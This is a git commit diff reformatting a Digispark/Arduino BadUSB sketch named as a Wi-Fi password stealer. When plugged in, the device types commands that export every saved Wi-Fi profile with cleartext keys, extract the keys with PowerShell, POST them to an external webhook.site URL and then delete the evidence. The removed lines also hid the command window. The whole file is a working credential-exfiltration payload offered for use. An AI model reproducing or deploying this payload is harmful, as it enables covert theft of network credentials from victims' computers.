a483232d7ed4cdfb939ef9c193fe04b0dafc2cfb
debbie-tommy <68273014+debbie-tommy@users.noreply.github.com>
2023-11-13 09:20:12 +1100

    Formatted Wifi pass stealer

--- StealWifiPasswd.ino
+++ StealWifiPasswd.ino
@@ -1,53 +1,42 @@
-/*
-  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
- rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
-*/
-//This payload is for stealing wifi passwords. External resources used include a webhook URL. 
-
-
 #include "DigiKeyboard.h"
-#define KEY_DOWN 0x51 // Keyboard Down Arrow
-#define KEY_ENTER 0x28 //Return/Enter Key
 
-void setup() {
-  pinMode(1, OUTPUT); //LED on Model A 
-}
+// Arrow Keys not defined in DigiKeyboard.h for some reason
+// Manually defining them
+#define KEY_ARROW_LEFT 0x50
+#define KEY_ARROW_RIGHT 0x4F
+#define KEY_ARROW_DOWN 0x51
+#define KEY_ARROW_UP 0x52
+
+void setup() {}
 
 void loop() {
-   
-  DigiKeyboard.update();
+  // Initialise digispark 
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(3000);
- 
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(100);
-  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
+
+  // Opens the run dialog and launches command shell
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
+  DigiKeyboard.println("cmd");
   DigiKeyboard.delay(500);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
-  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
-  for(int i =0; i < 100; i++)
-    {
-      DigiKeyboard.sendKeyStroke(KEY_DOWN);
-    }
-  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cd %temp%"); //going to temporary directory
+  
+  // Creates temporary directory
+  DigiKeyboard.println("cd %temp%");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("netsh wlan export profile key=clear"); //grabs all the saved wifi passwords and saves them in temporary dir
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracts all password and saves them in Wi-Fi-Pass file in temporary dir
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/aa586e09-a372-495c-ae8e-e09876e704a7 -Method POST -InFile Wi-Fi-PASS"); //Submits all passwords on hook
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
-  DigiKeyboard.delay(100);
+
+  // Get Wifi network profiles using netsh (https://www.makeuseof.com/windows-back-up-restore-network-profiles/)
+  DigiKeyboard.println("netsh wlan export profile key=clear");
+  DigiKeyboard.delay(500);
+  // Output required info into a temporary file using powershell
+  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); 
+  DigiKeyboard.delay(500);
+  // Send info to remote webhook URL
+  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/aa586e09-a372-495c-ae8e-e09876e704a7 -Method POST -InFile Wi-Fi-PASS"); 
+  DigiKeyboard.delay(500);
+  // Delete temporary file
+  DigiKeyboard.println("del Wi-* /s /f /q");
+  DigiKeyboard.delay(500);
   DigiKeyboard.println("exit");
-  DigiKeyboard.delay(100);
   
-  digitalWrite(1, HIGH); //turn on led when program finishes
-  DigiKeyboard.delay(90000);
-  digitalWrite(1, LOW); 
-  DigiKeyboard.delay(5000);
-  
+  for (;;) {/* Stops the loop */}
 }
